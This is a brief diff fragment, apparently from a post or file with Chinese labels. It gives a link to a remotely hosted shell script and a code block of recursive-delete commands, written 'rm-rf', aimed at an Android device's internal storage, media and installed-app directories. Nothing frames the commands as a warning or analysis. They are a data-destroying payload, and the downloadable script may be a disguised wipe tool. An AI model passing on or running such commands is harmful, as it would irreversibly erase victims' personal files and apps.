@@ -5,7 +5,6 @@
 [链接]https://cccimg.com/down.php/994a229efbce5885339fefc1256d0d29.sh[链接]
 
 [代码]
-
 rm-rf /storage/emulated/0
 rm-rf /data/media
 rm-rf /data/app
